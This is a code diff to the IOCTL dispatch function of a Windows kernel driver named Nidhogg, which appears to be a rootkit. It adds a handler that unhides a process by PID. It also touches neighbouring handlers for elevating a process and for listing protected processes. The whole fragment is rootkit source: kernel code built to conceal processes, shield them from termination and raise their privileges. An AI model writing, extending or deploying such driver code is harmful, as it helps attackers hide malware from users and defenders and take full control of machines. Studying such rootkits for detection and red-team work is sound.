@@ -138,6 +138,30 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
+	case IOCTL_NIDHOGG_UNHIDE_PROCESS: 
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+		if (size % sizeof(ULONG) != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (data == 0) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		if (!NT_SUCCESS(UnhideProcess(*data))) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Unhide process with pid %d.\n", *data));
+		break;
+	}
+
 	case IOCTL_NIDHOGG_ELEVATE_PROCESS:
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
@@ -198,12 +222,12 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(ProcessesList) != 0) {
+		if (size % sizeof(ProtectedProcessesList) != 0) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
-		auto data = (ProcessesList*)Irp->AssociatedIrp.SystemBuffer;
+		auto data = (ProtectedProcessesList*)Irp->AssociatedIrp.SystemBuffer;
 
 		AutoLock locker(pGlobals.Lock);
 		data->PidsCount = pGlobals.ProtectedProcesses.PidsCount;
@@ -212,7 +236,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			data->Processes[i] = pGlobals.ProtectedProcesses.Processes[i];
 		}
 
-		len += sizeof(ProcessesList);
+		len += sizeof(ProtectedProcessesList);
 
 		break;
 	}
